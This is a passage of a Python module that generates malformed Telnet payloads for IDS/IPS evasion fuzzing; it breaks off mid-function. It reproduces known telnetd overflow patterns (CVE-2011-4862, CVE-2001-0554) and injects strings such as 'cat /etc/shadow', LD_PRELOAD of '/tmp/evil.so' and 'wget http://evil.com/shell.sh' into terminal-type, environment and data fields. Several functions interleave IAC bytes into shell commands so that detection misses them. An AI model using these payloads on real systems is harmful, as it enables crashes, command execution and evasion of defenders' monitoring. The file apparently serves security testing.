"""
Telnet protocol mutation strategies for IDS/IPS evasion fuzzing.

Grounded in:
  - RFC 854   (Telnet Protocol Specification, May 1983)
  - RFC 855   (Telnet Option Specifications)
  - RFC 856   (Telnet Binary Transmission)
  - RFC 857   (Telnet Echo Option)
  - RFC 858   (Telnet Suppress Go Ahead)
  - RFC 859   (Telnet Status Option)
  - RFC 860   (Telnet Timing Mark)
  - RFC 861   (Telnet Extended Options: List)
  - RFC 1091  (Telnet Terminal-Type Option)
  - RFC 1116  (Telnet Linemode Option)
  - RFC 1184  (Telnet Linemode Option — revised)
  - RFC 1372  (Telnet Remote Flow Control)
  - RFC 1408/1572  (Telnet Environment Option)
  - RFC 2217  (Telnet Com Port Control Option)
  - RFC 4777  (IBM iSeries Telnet Enhancements)
  - draft-ietf-opsawg-mud-iot-dns-considerations (MUD Telnet extensions)
  - CVE-2020-10188  (netkit-telnetd arbitrary code execution via short writes)
  - CVE-2020-28017  (Exim BDAT Telnet special-character escape)
  - CVE-2011-4862  (FreeBSD telnetd encrypt_keyid heap overflow)
  - CVE-2022-29153  (Consul Telnet protocol smuggling)
  - CVE-2001-0554  (telnetd AYT overflow — CERT VU#745371)
  - CVE-2023-33230  (Sitecom router Telnet command injection)
  - Nmap scripts: telnet-brute, telnet-encryption, telnet-ntlm-info

Transport: TCP port 23.  Text-based NVT (Network Virtual Terminal) protocol
with in-band IAC (0xFF) escape sequences for option negotiation.

Key protocol concepts:
  - IAC (Interpret As Command) = 0xFF — escape byte
  - IAC IAC = literal 0xFF in data stream
  - IAC <cmd> where cmd = WILL(0xFB)/WONT(0xFC)/DO(0xFD)/DONT(0xFE)
  - IAC SB <option> <data...> IAC SE — sub-negotiation
  - NVT: 7-bit ASCII, CR must be followed by LF or NUL
  - Commands: NOP(0xF1), DM(0xF2), BRK(0xF3), IP(0xF4), AO(0xF5),
              AYT(0xF6), EC(0xF7), EL(0xF8), GA(0xF9)
  - Options: Binary(0), Echo(1), SGA(3), Status(5), TimingMark(6),
             TermType(24), NAWS(31), TermSpeed(32), FlowCtrl(33),
             Linemode(34), Env(36), NewEnv(39), Encrypt(38), Auth(37)
"""

import os
import random
import struct

# ── Telnet Constants ─────────────────────────────────────────────────────────

# IAC escape byte
_IAC  = 0xFF

# Commands
_DONT = 0xFE
_DO   = 0xFD
_WONT = 0xFC
_WILL = 0xFB
_SB   = 0xFA   # sub-negotiation begin
_GA   = 0xF9   # Go Ahead
_EL   = 0xF8   # Erase Line
_EC   = 0xF7   # Erase Character
_AYT  = 0xF6   # Are You There
_AO   = 0xF5   # Abort Output
_IP   = 0xF4   # Interrupt Process
_BRK  = 0xF3   # Break
_DM   = 0xF2   # Data Mark
_NOP  = 0xF1   # No Operation
_SE   = 0xF0   # Sub-negotiation End
_EOR  = 0xEF   # End of Record (RFC 885)
_ABORT = 0xEE  # Abort
_SUSP  = 0xED  # Suspend Process
_EOF   = 0xEC  # End of File

# Commonly used options
_OPT_BINARY    = 0x00   # RFC 856
_OPT_ECHO      = 0x01   # RFC 857
_OPT_SGA       = 0x03   # RFC 858 (Suppress Go Ahead)
_OPT_STATUS    = 0x05   # RFC 859
_OPT_TIMING    = 0x06   # RFC 860
_OPT_TERMTYPE  = 0x18   # RFC 1091 (24)
_OPT_NAWS      = 0x1F   # RFC 1073 (31) — Negotiate About Window Size
_OPT_TERMSPEED = 0x20   # RFC 1079 (32)
_OPT_FLOWCTRL  = 0x21   # RFC 1372 (33)
_OPT_LINEMODE  = 0x22   # RFC 1184 (34)
_OPT_ENV       = 0x24   # RFC 1408 (36)
_OPT_AUTH      = 0x25   # RFC 2941 (37)
_OPT_ENCRYPT   = 0x26   # RFC 2946 (38)
_OPT_NEWENV    = 0x27   # RFC 1572 (39)
_OPT_COMPORT   = 0x2C   # RFC 2217 (44)
_OPT_EXOPL     = 0xFF   # RFC 861 (255) — Extended Options List

# TermType sub-negotiation commands
_TT_IS   = 0x00
_TT_SEND = 0x01

# NewEnv sub-negotiation types
_NE_VAR     = 0x00
_NE_VALUE   = 0x01
_NE_ESC     = 0x02
_NE_USERVAR = 0x03

_TELNET_PORT = 23
_MAX_PKT = 65535   # sane cap for TCP payloads

# ── Strategy metadata ────────────────────────────────────────────────────────

TELNET_STRATEGIES = [
    "iac_sequence_injection",
    "option_negotiation_flood",
    "subnegotiation_overflow",
    "naws_window_manipulation",
    "terminal_type_overflow",
    "environment_variable_injection",
    "authentication_option_abuse",
    "encrypt_option_exploit",
    "command_injection_evasion",
    "line_ending_confusion",
    "data_mark_urgent_abuse",
    "iac_escape_desync",
    "comport_option_overflow",
    "tcp_segmentation_evasion",
]

TELNET_WEIGHTS = [10, 8, 14, 6, 10, 10, 8, 12, 10, 6, 8, 12, 5, 5]

TELNET_STRATEGY_LABELS = {
    "iac_sequence_injection":          "IAC Sequence Injection",
    "option_negotiation_flood":        "Option Negotiation Flood",
    "subnegotiation_overflow":         "Sub-Negotiation Overflow",
    "naws_window_manipulation":        "NAWS Window Manipulation",
    "terminal_type_overflow":          "Terminal-Type Overflow",
    "environment_variable_injection":  "Environment Variable Injection",
    "authentication_option_abuse":     "Authentication Option Abuse",
    "encrypt_option_exploit":          "Encrypt Option Exploit",
    "command_injection_evasion":       "Command Injection Evasion",
    "line_ending_confusion":           "Line Ending Confusion",
    "data_mark_urgent_abuse":          "Data Mark / Urgent Abuse",
    "iac_escape_desync":               "IAC Escape Desync",
    "comport_option_overflow":         "COM Port Option Overflow",
    "tcp_segmentation_evasion":        "TCP Segmentation Evasion",
}

# ── Helpers ──────────────────────────────────────────────────────────────────

def _iac_cmd(cmd, option=None):
    """Build a 2 or 3-byte IAC command."""
    if option is not None:
        return bytes([_IAC, cmd, option])
    return bytes([_IAC, cmd])


def _iac_sb(option, data):
    """Build IAC SB <option> <data> IAC SE."""
    return bytes([_IAC, _SB, option]) + data + bytes([_IAC, _SE])


def _rand_bytes(n):
    return os.urandom(n)


def _clamp(data):
    """Cap payload to sane TCP size."""
    if len(data) > _MAX_PKT:
        return data[:_MAX_PKT]
    return data


# ── Strategy builders ────────────────────────────────────────────────────────

def _build_iac_sequence_injection(payload_override=None):
    """Inject malformed / unexpected IAC sequences into the data stream.

    CVE-2001-0554 (AYT overflow) — flood of AYT commands caused heap corruption
    in telnetd.  Also tests: orphaned IAC (single 0xFF at end), IAC followed by
    invalid command byte, rapid alternation of IAC NOP, IAC with 0x00 (reserved),
    many sequential IAC GA to confuse half-duplex parsers, IAC followed by data
    byte < 0xF0 (undefined range).
    """
    if payload_override is not None:
        payload = b""
        for b in payload_override:
            payload += bytes([b]) + _iac_cmd(_NOP)
        return payload, _TELNET_PORT
    variant = random.randint(0, 7)
    if variant == 0:
        # CVE-2001-0554 pattern: AYT flood
        payload = _iac_cmd(_AYT) * random.randint(500, 2000)
    elif variant == 1:
        # Orphaned IAC at end of data stream
        payload = b"USER admin\r\n" + bytes([_IAC])
    elif variant == 2:
        # IAC followed by invalid command byte (0x00-0xEC)
        bad_cmd = random.randint(0x00, 0xEC)
        payload = bytes([_IAC, bad_cmd]) * random.randint(10, 100)
    elif variant == 3:
        # Rapid IAC NOP flood
        payload = _iac_cmd(_NOP) * random.randint(1000, 5000)
    elif variant == 4:
        # IAC followed by 0x00 (reserved / undefined)
        payload = bytes([_IAC, 0x00]) * random.randint(50, 200)
    elif variant == 5:
        # Sequential IAC GA to confuse half-duplex state
        payload = _iac_cmd(_GA) * random.randint(200, 1000)
    elif variant == 6:
        # Mixed valid commands in rapid succession
        cmds = [_NOP, _AYT, _GA, _AO, _IP, _BRK, _EC, _EL]
        payload = b""
        for _ in range(random.randint(200, 800)):
            payload += _iac_cmd(random.choice(cmds))
    else:
        # IAC EOR flood (RFC 885) — some parsers don't expect this
        payload = _iac_cmd(_EOR) * random.randint(200, 1000)
    return payload, _TELNET_PORT


def _build_option_negotiation_flood():
    """Flood WILL/WONT/DO/DONT option negotiation to exhaust parser state.

    Tests: all 256 option codes negotiated simultaneously, contradictory
    negotiation (WILL+WONT for same option), unknown option codes (128-254),
    rapid WILL/DO cycling for a single option, EXOPL (option 255) abuse,
    enormous negotiation burst with all four commands for all options.
    """
    variant = random.randint(0, 6)
    if variant == 0:
        # WILL for all 256 options
        payload = b""
        for opt in range(256):
            payload += _iac_cmd(_WILL, opt)
    elif variant == 1:
        # Contradictory: WILL then WONT for each option
        payload = b""
        for opt in range(256):
            payload += _iac_cmd(_WILL, opt) + _iac_cmd(_WONT, opt)
    elif variant == 2:
        # DO for all unknown options (128-254)
        payload = b""
        for opt in range(128, 255):
            payload += _iac_cmd(_DO, opt)
    elif variant == 3:
        # Rapid cycling: WILL/WONT for Echo option
        payload = b""
        for _ in range(random.randint(500, 2000)):
            payload += _iac_cmd(_WILL, _OPT_ECHO) + _iac_cmd(_WONT, _OPT_ECHO)
    elif variant == 4:
        # EXOPL (option 255) abuse — IAC WILL 0xFF looks like IAC WILL IAC
        payload = _iac_cmd(_WILL, 0xFF) * random.randint(100, 500)
    elif variant == 5:
        # All four commands for every option
        payload = b""
        for opt in range(256):
            payload += (_iac_cmd(_WILL, opt) + _iac_cmd(_WONT, opt) +
                        _iac_cmd(_DO, opt) + _iac_cmd(_DONT, opt))
    else:
        # DO/DONT flood for SGA (option 3) — common negotiation
        payload = b""
        for _ in range(random.randint(500, 2000)):
            payload += _iac_cmd(_DO, _OPT_SGA) + _iac_cmd(_DONT, _OPT_SGA)
    return payload, _TELNET_PORT


def _build_subnegotiation_overflow():
    """Oversized or malformed sub-negotiation payloads.

    CVE-2011-4862 (FreeBSD telnetd encrypt_keyid heap overflow) — oversized
    SB ENCRYPT data caused heap corruption.  Also tests: SB without matching SE,
    nested SB...SB...SE, zero-length SB, SB with 64KB data, SB for option
    not previously negotiated, SB with IAC bytes in data (must be escaped as
    IAC IAC but what if they aren't?).
    """
    variant = random.randint(0, 7)
    if variant == 0:
        # CVE-2011-4862 pattern: oversized ENCRYPT SB
        payload = _iac_sb(_OPT_ENCRYPT, _rand_bytes(random.randint(4096, 16384)))
    elif variant == 1:
        # SB without SE (unterminated)
        payload = bytes([_IAC, _SB, _OPT_TERMTYPE]) + _rand_bytes(1024)
    elif variant == 2:
        # Nested SB...SB...SE (SB inside SB)
        inner = bytes([_IAC, _SB, _OPT_ECHO]) + b"nested" + bytes([_IAC, _SE])
        payload = _iac_sb(_OPT_TERMTYPE, inner)
    elif variant == 3:
        # Zero-length SB
        payload = _iac_sb(_OPT_NEWENV, b"")
    elif variant == 4:
        # SB with 64KB data
        payload = _iac_sb(_OPT_TERMTYPE, _rand_bytes(65535))
    elif variant == 5:
        # SB for un-negotiated option
        payload = _iac_sb(random.randint(128, 254), _rand_bytes(random.randint(100, 2000)))
    elif variant == 6:
        # SB with unescaped IAC in data (should be IAC IAC)
        data = b"\xff" * random.randint(50, 200)  # raw 0xFF without doubling
        payload = bytes([_IAC, _SB, _OPT_TERMTYPE]) + data + bytes([_IAC, _SE])
    else:
        # Multiple overlapping SBs
        payload = b""
        for _ in range(random.randint(50, 200)):
            opt = random.randint(0, 49)
            payload += _iac_sb(opt, _rand_bytes(random.randint(10, 500)))
    return payload, _TELNET_PORT


def _build_naws_window_manipulation():
    """NAWS (Negotiate About Window Size, RFC 1073) abuse.

    NAWS SB carries 4 bytes: width(16-bit) + height(16-bit).  Tests: zero
    dimensions (0x0), enormous dimensions (0xFFFF x 0xFFFF), negative-appearing
    values, NAWS with wrong data length (3, 5, 100 bytes), NAWS flood,
    NAWS without prior DO/WILL negotiation, NAWS with IAC bytes in dimension
    values (0xFF must be escaped).
    """
    variant = random.randint(0, 6)
    if variant == 0:
        # Zero dimensions
        payload = _iac_cmd(_WILL, _OPT_NAWS)
        payload += _iac_sb(_OPT_NAWS, struct.pack(">HH", 0, 0))
    elif variant == 1:
        # Maximum dimensions
        payload = _iac_cmd(_WILL, _OPT_NAWS)
        payload += _iac_sb(_OPT_NAWS, struct.pack(">HH", 0xFFFF, 0xFFFF))
    elif variant == 2:
        # Wrong data length (too short — 3 bytes)
        payload = _iac_cmd(_WILL, _OPT_NAWS)
        payload += _iac_sb(_OPT_NAWS, b"\x00\x50\x00")
    elif variant == 3:
        # Wrong data length (too long — 100 bytes)
        payload = _iac_cmd(_WILL, _OPT_NAWS)
        payload += _iac_sb(_OPT_NAWS, _rand_bytes(100))
    elif variant == 4:
        # NAWS flood — rapid resize
        payload = _iac_cmd(_WILL, _OPT_NAWS)
        for _ in range(random.randint(200, 1000)):
            w = random.randint(0, 0xFFFF)
            h = random.randint(0, 0xFFFF)
            payload += _iac_sb(_OPT_NAWS, struct.pack(">HH", w, h))
    elif variant == 5:
        # NAWS without negotiation
        payload = _iac_sb(_OPT_NAWS, struct.pack(">HH", 80, 24))
    else:
        # NAWS with IAC bytes in dimensions (0x00FF width = contains 0xFF)
        # Width = 0x00FF requires IAC escaping inside SB
        raw = struct.pack(">HH", 0x00FF, 0xFF00)
        payload = _iac_cmd(_WILL, _OPT_NAWS) + _iac_sb(_OPT_NAWS, raw)
    return payload, _TELNET_PORT


def _build_terminal_type_overflow():
    """Terminal-Type (RFC 1091) sub-negotiation abuse.

    Terminal type is sent as: IAC SB TERMTYPE IS <type-string> IAC SE.
    Tests: oversized terminal type string (5-30KB), empty type, null bytes
    in type string, terminal type with IAC bytes, format string chars (%n%s),
    huge number of TERMTYPE IS responses, type string with shell metacharacters.
    """
    variant = random.randint(0, 7)
    if variant == 0:
        # Oversized terminal type
        ttype = b"A" * random.randint(5000, 30000)
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + ttype)
    elif variant == 1:
        # Empty terminal type
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]))
    elif variant == 2:
        # Null bytes in type
        ttype = b"xterm\x00\x00\x00vt100\x00"
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + ttype)
    elif variant == 3:
        # Terminal type with raw IAC bytes (unescaped)
        ttype = b"xterm" + b"\xff\xff\xff" + b"vt100"
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + ttype)
    elif variant == 4:
        # Format string characters
        ttype = b"%n%n%n%s%s%x%x%x" * random.randint(100, 500)
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + ttype)
    elif variant == 5:
        # Flood of TERMTYPE IS responses
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        for _ in range(random.randint(100, 500)):
            ttype = _rand_bytes(random.randint(10, 200))
            payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + ttype)
    elif variant == 6:
        # Shell metacharacters
        ttype = b"xterm;/bin/sh -c 'id'|`cat /etc/passwd`|$(whoami)"
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + ttype)
    else:
        # Type with only non-printable bytes
        ttype = bytes(range(0, 32)) * 100
        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + ttype)
    return payload, _TELNET_PORT


def _build_environment_variable_injection():
    """Environment variable sub-negotiation (RFC 1572 NEW-ENVIRON) abuse.

    CVE-2023-33230 (Sitecom router command injection via Telnet ENV).
    NEW-ENVIRON SB carries VAR/USERVAR name-value pairs.  Tests: oversized
    VAR name/value, shell injection in VAR value, LD_PRELOAD/PATH injection,
    hundreds of VARs, embedded NUL/IAC in values, conflicting VAR/USERVAR
    with same name, empty VAR name.
    """
    variant = random.randint(0, 7)
    if variant == 0:
        # Oversized VAR value
        data = bytes([0x00])  # IS
        data += bytes([_NE_VAR]) + b"TERM" + bytes([_NE_VALUE]) + b"A" * random.randint(5000, 20000)
        payload = _iac_cmd(_WILL, _OPT_NEWENV) + _iac_sb(_OPT_NEWENV, data)
    elif variant == 1:
        # Shell injection in VAR value
        data = bytes([0x00])  # IS
        data += bytes([_NE_VAR]) + b"TERM" + bytes([_NE_VALUE])
        data += b"xterm;/bin/sh -c 'cat /etc/shadow'"
        payload = _iac_cmd(_WILL, _OPT_NEWENV) + _iac_sb(_OPT_NEWENV, data)
    elif variant == 2:
        # LD_PRELOAD injection
        data = bytes([0x00])
        data += bytes([_NE_VAR]) + b"LD_PRELOAD" + bytes([_NE_VALUE]) + b"/tmp/evil.so"
        data += bytes([_NE_VAR]) + b"PATH" + bytes([_NE_VALUE]) + b"/tmp:/bin"
        payload = _iac_cmd(_WILL, _OPT_NEWENV) + _iac_sb(_OPT_NEWENV, data)
    elif variant == 3:
        # Hundreds of VARs
        data = bytes([0x00])
        for i in range(random.randint(200, 500)):
            name = f"VAR_{i}".encode()
            val = _rand_bytes(random.randint(10, 100))
            data += bytes([_NE_VAR]) + name + bytes([_NE_VALUE]) + val
        payload = _iac_cmd(_WILL, _OPT_NEWENV) + _iac_sb(_OPT_NEWENV, data)
    elif variant == 4:
        # Embedded NUL in values
        data = bytes([0x00])
        data += bytes([_NE_VAR]) + b"USER" + bytes([_NE_VALUE]) + b"root\x00admin\x00"
        payload = _iac_cmd(_WILL, _OPT_NEWENV) + _iac_sb(_OPT_NEWENV, data)
    elif variant == 5:
        # Conflicting VAR/USERVAR with same name
        data = bytes([0x00])
        data += bytes([_NE_VAR]) + b"USER" + bytes([_NE_VALUE]) + b"admin"
        data += bytes([_NE_USERVAR]) + b"USER" + bytes([_NE_VALUE]) + b"root"
        payload = _iac_cmd(_WILL, _OPT_NEWENV) + _iac_sb(_OPT_NEWENV, data)
    elif variant == 6:
        # Empty VAR name
        data = bytes([0x00])
        data += bytes([_NE_VAR]) + b"" + bytes([_NE_VALUE]) + b"evil"
        payload = _iac_cmd(_WILL, _OPT_NEWENV) + _iac_sb(_OPT_NEWENV, data)
    else:
        # ESC byte abuse — escape character in var data
        data = bytes([0x00])
        data += bytes([_NE_VAR]) + b"TERM" + bytes([_NE_ESC]) + bytes([_NE_VALUE]) + b"xterm"
        data += bytes([_NE_VAR]) + bytes([_NE_ESC, _NE_ESC, _NE_ESC]) + bytes([_NE_VALUE]) + b"test"
        payload = _iac_cmd(_WILL, _OPT_NEWENV) + _iac_sb(_OPT_NEWENV, data)
    return payload, _TELNET_PORT


def _build_authentication_option_abuse():
    """Telnet Authentication Option (RFC 2941) abuse.

    AUTH SB: <SEND|IS|REPLY|NAME> + auth-type pairs.  Tests: oversized NAME
    field, unknown auth types (128-255), empty auth data, IS without SEND,
    many auth-type pairs, auth with way modifier bits set incorrectly,
    rapid auth cycling.
    """
    _AUTH_SEND  = 0x01
    _AUTH_IS    = 0x00
    _AUTH_NAME  = 0x03

    variant = random.randint(0, 6)
    if variant == 0:
        # Oversized NAME field
        data = bytes([_AUTH_NAME]) + _rand_bytes(random.randint(5000, 20000))
        payload = _iac_cmd(_WILL, _OPT_AUTH) + _iac_sb(_OPT_AUTH, data)
    elif variant == 1:
        # Unknown auth types flood
        data = bytes([_AUTH_IS])
        for _ in range(random.randint(50, 200)):
            data += bytes([random.randint(128, 255), random.randint(0, 15)])
            data += _rand_bytes(random.randint(10, 100))
        payload = _iac_cmd(_WILL, _OPT_AUTH) + _iac_sb(_OPT_AUTH, data)
    elif variant == 2:
        # Empty auth IS
        data = bytes([_AUTH_IS])
        payload = _iac_cmd(_WILL, _OPT_AUTH) + _iac_sb(_OPT_AUTH, data)
    elif variant == 3:
        # IS without prior SEND
        data = bytes([_AUTH_IS, 0x00, 0x00]) + _rand_bytes(128)
        payload = _iac_sb(_OPT_AUTH, data)  # no WILL negotiation first
    elif variant == 4:
        # Many auth-type pairs
        data = bytes([_AUTH_SEND])
        for _ in range(random.randint(100, 500)):
            data += bytes([random.randint(0, 20), random.randint(0, 15)])
        payload = _iac_cmd(_DO, _OPT_AUTH) + _iac_sb(_OPT_AUTH, data)
    elif variant == 5:
        # Auth with modifier bits set (one-way, encrypt flags)
        data = bytes([_AUTH_IS, 0x02, 0x0F])  # Kerberos + all modifier bits
        data += _rand_bytes(random.randint(500, 2000))
        payload = _iac_cmd(_WILL, _OPT_AUTH) + _iac_sb(_OPT_AUTH, data)
    else:
        # Rapid auth cycling
        payload = b""
        for _ in range(random.randint(100, 500)):
            payload += _iac_cmd(_WILL, _OPT_AUTH)
            payload += _iac_cmd(_WONT, _OPT_AUTH)
            data = bytes([_AUTH_IS, random.randint(0, 10), 0x00]) + _rand_bytes(16)
            payload += _iac_sb(_OPT_AUTH, data)
    return payload, _TELNET_PORT


def _build_encrypt_option_exploit(payload_override=None):
    """Telnet Encryption Option (RFC 2946) exploitation.

    CVE-2011-4862 (FreeBSD telnetd encrypt_keyid heap overflow) — oversized
    ENCRYPT SB data overflowed a fixed-size buffer in the encrypt_keyid function.
    Tests: exact CVE pattern (oversized keyid), ENCRYPT with unknown type codes,
    ENCRYPT SB with no data, ENCRYPT key followed by enormous data,
    ENCRYPT_SUPPORT with all types, ENCRYPT_START without negotiation,
    ENCRYPT_IS/REPLY with format-string patterns.
    """
    if payload_override is not None:
        _ENC_KEYID = 0x07
        data = bytes([_ENC_KEYID]) + payload_override
        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, data)
        return payload, _TELNET_PORT
    _ENC_IS        = 0x00
    _ENC_SUPPORT   = 0x01
    _ENC_REPLY     = 0x02
    _ENC_START     = 0x03
    _ENC_END       = 0x04
    _ENC_KEYID     = 0x07
    _ENC_DEC_KEYID = 0x08

    variant = random.randint(0, 7)
    if variant == 0:
        # CVE-2011-4862 pattern: oversized encrypt keyid
        data = bytes([_ENC_KEYID]) + _rand_bytes(random.randint(4096, 32768))
        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, data)
    elif variant == 1:
        # Unknown encryption types
        data = bytes([_ENC_SUPPORT])
        for t in range(random.randint(50, 200)):
            data += bytes([random.randint(20, 255)])
        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, data)
    elif variant == 2:
        # Empty ENCRYPT SB
        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, b"")
    elif variant == 3:
        # ENCRYPT_IS with huge data
        data = bytes([_ENC_IS, 0x01]) + _rand_bytes(random.randint(8192, 32768))
        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, data)
    elif variant == 4:
        # ENCRYPT_SUPPORT with all 256 type codes
        data = bytes([_ENC_SUPPORT]) + bytes(range(256))
        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, data)
    elif variant == 5:
        # ENCRYPT_START without prior negotiation
        data = bytes([_ENC_START]) + _rand_bytes(16)
        payload = _iac_sb(_OPT_ENCRYPT, data)
    elif variant == 6:
        # ENCRYPT_REPLY with format strings
        data = bytes([_ENC_REPLY]) + b"%n%n%s%s%x" * 500
        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, data)
    else:
        # DEC_KEYID oversized
        data = bytes([_ENC_DEC_KEYID]) + _rand_bytes(random.randint(4096, 16384))
        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, data)
    return payload, _TELNET_PORT


def _build_command_injection_evasion(payload_override=None):
    """Telnet command injection and IDS content-match evasion.

    CVE-2022-29153 (Consul Telnet smuggling), CVE-2020-28017 (Exim BDAT special
    char escape).  Injects shell commands interleaved with IAC sequences to
    break IDS content matching.  Tests: command with IAC NOP between every byte,
    command with IAC IAC (literal 0xFF) insertion, backspace (EC) evasion
    (type bad chars then erase them), Go Ahead insertion between command chars,
    null byte insertion, command split across Telnet sub-negotiations.
    """
    if payload_override is not None:
        mid = len(payload_override) // 2
        payload = payload_override[:mid]
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + b"xterm")
        payload += payload_override[mid:] + b"\r\n"
        return payload, _TELNET_PORT
    variant = random.randint(0, 7)
    cmd = random.choice([
        b"cat /etc/passwd",
        b"id; whoami",
        b"/bin/sh -c 'ls -la'",
        b"wget http://evil.com/shell.sh",
        b"echo EICAR-TEST-FILE",
    ])
    if variant == 0:
        # IAC NOP between every byte
        payload = b""
        for b in cmd:
            payload += bytes([b]) + _iac_cmd(_NOP)
    elif variant == 1:
        # IAC IAC (literal 0xFF) insertion
        payload = b""
        for i, b in enumerate(cmd):
            payload += bytes([b])
            if i % 3 == 0:
                payload += bytes([_IAC, _IAC])  # literal 0xFF
    elif variant == 2:
        # Backspace evasion: type garbage, erase, then real command
        garbage = _rand_bytes(len(cmd))
        erase = _iac_cmd(_EC) * len(garbage)
        payload = garbage + erase + cmd + b"\r\n"
    elif variant == 3:
        # Go Ahead insertion
        payload = b""
        for b in cmd:
            payload += bytes([b]) + _iac_cmd(_GA)
        payload += b"\r\n"
    elif variant == 4:
        # Null byte insertion between chars
        payload = b""
        for b in cmd:
            payload += bytes([b, 0x00])
        payload += b"\r\n"
    elif variant == 5:
        # Command split across SB/SE
        mid = len(cmd) // 2
        payload = cmd[:mid]
        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + b"xterm")
        payload += cmd[mid:] + b"\r\n"
    elif variant == 6:
        # EL (Erase Line) then real command
        payload = b"harmless text" + _iac_cmd(_EL) + cmd + b"\r\n"
    else:
        # Mixed NOP + AYT + command bytes
        payload = b""
        for b in cmd:
            payload += bytes([b])
            payload += _iac_cmd(random.choice([_NOP, _AYT, _GA]))
        payload += b"\r\n"
    return payload, _TELNET_PORT


def _build_line_ending_confusion():
    """NVT line-ending rule violations.

    RFC 854 requires CR to be followed by LF (CRLF) or NUL (CR-NUL).
    Tests: bare CR without LF/NUL, bare LF without CR, CR followed by
    arbitrary byte, mixed line endings in same stream, oversized line
    (no CRLF for 64KB+), Unicode line separators, CR-CR-LF sequences.
    """
    variant = random.randint(0, 6)
    if variant == 0:
        # Bare CR (no LF or NUL)
        payload = b"USER admin\rPASS password\rquit\r"
    elif variant == 1:
        # Bare LF (no CR)
        payload = b"USER admin\nPASS password\nquit\n"
    elif variant == 2:
        # CR followed by arbitrary byte (not LF or NUL)
        payload = b"USER admin\r\xffPASS password\r\x01quit\r\x80"
    elif variant == 3:
        # Mixed line endings
        payload = b"USER admin\r\nPASS pass\rquit\n"
    elif variant == 4:
        # Oversized line — no CRLF for 64KB
        payload = b"A" * random.randint(65000, 65535) + b"\r\n"
    elif variant == 5:
        # Unicode line separators (U+2028, U+2029 in UTF-8)
        payload = b"USER admin" + b"\xe2\x80\xa8" + b"PASS pass" + b"\xe2\x80\xa9"
    else:
        # CR CR LF sequences
        payload = b"USER admin\r\r\nPASS pass\r\r\r\nquit\r\r\n"
    return payload, _TELNET_PORT


def _build_data_mark_urgent_abuse():
    """Data Mark (DM) and TCP Urgent pointer abuse.

    Telnet DM (0xF2) is used with TCP urgent mode to implement Synch signal.
    The DM should be the last byte of urgent data.  Tests: DM without urgent
    pointer, DM flood, DM interleaved with data to confuse parser state,
    IP (Interrupt Process) + DM Synch combination, multiple DMs in sequence,
    DM inside sub-negotiation, AO + DM combination.
    """
    variant = random.randint(0, 6)
    if variant == 0:
        # DM flood without TCP urgent
        payload = _iac_cmd(_DM) * random.randint(500, 2000)
    elif variant == 1:
        # DM interleaved with data
        payload = b""
        for c in b"USER admin\r\nPASS pass\r\n":
            payload += bytes([c]) + _iac_cmd(_DM)
    elif variant == 2:
        # IP + DM Synch (proper Synch sequence but rapid)
        payload = b""
        for _ in range(random.randint(100, 500)):
            payload += _iac_cmd(_IP) + _iac_cmd(_DM)
    elif variant == 3:
        # Multiple DMs in sequence
        payload = b"data before" + _iac_cmd(_DM) * 200 + b"data after\r\n"
    elif variant == 4:
        # DM inside sub-negotiation (illegal)
        payload = bytes([_IAC, _SB, _OPT_TERMTYPE])
        payload += bytes([_IAC, _DM])  # DM inside SB
        payload += bytes([_IAC, _SE])
    elif variant == 5:
        # AO + DM combination
        payload = b""
        for _ in range(random.randint(100, 500)):
            payload += _iac_cmd(_AO) + _iac_cmd(_DM)
    else:
        # BRK + DM rapid cycling
        payload = b""
        for _ in range(random.randint(200, 1000)):
            payload += _iac_cmd(_BRK) + _iac_cmd(_DM)
    return payload, _TELNET_PORT


def _build_iac_escape_desync(payload_override=None):
    """IAC escape sequence parser desynchronization.

    The IAC (0xFF) byte must be doubled (IAC IAC) in data to represent literal
    0xFF.  Tests: single IAC at buffer boundaries, triple IAC (odd count),
    IAC before every NVT command to shift parser state, IAC in middle of
    multi-byte option negotiation, rapid IAC toggling between command and data
    mode, IAC at exact buffer boundary sizes (256, 512, 1024, 4096).
    """
    if payload_override is not None:
        payload = b""
        for b_val in payload_override:
            payload += bytes([b_val])
            if b_val == 0xFF:
                payload += bytes([_IAC, _IAC])
        return payload, _TELNET_PORT
    variant = random.randint(0, 7)
    if variant == 0:
        # Single IAC at various buffer boundaries
        payload = b""
        for boundary in [255, 511, 1023, 4095]:
            payload += b"A" * boundary + bytes([_IAC])
    elif variant == 1:
        # Triple IAC (odd count — parser confusion)
        payload = bytes([_IAC, _IAC, _IAC]) * random.randint(100, 500)
    elif variant == 2:
        # IAC before every WILL/WONT (double-IAC then command)
        payload = b""
        for opt in range(50):
            payload += bytes([_IAC, _IAC]) + _iac_cmd(_WILL, opt)
    elif variant == 3:
        # IAC splitting option negotiation: IAC + half of command
        payload = b""
        for _ in range(random.randint(100, 500)):
